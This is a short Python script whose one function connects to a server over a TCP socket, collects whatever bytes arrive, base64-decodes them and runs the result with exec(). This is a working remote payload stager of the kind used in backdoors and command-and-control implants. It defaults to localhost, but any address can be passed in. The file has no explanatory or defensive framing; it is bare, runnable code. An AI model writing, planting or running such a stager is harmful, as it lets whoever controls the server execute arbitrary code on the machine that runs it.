import socket
import base64


def client(connectto='127.0.0.1',port=12345):
    """
    Connects to a server and attempts to base64 decode and execute the received payload
        Args:
            connectto (str): IPv4 address in dotted decimal notation of the server to connect to
            port (int): port number that the server is listening on
        Returns:
            None
    """
    payload = bytearray() # extend this bytearray with data received until 0 bytes received

    s = socket.socket()
    s.connect((connectto, port))
    buf = s.recv(4096)

    while buf:
        payload.extend(buf)
        buf = s.recv(4096)

    decoded = base64.standard_b64decode(payload)
    exec(decoded)


if __name__ == '__main__':
    client()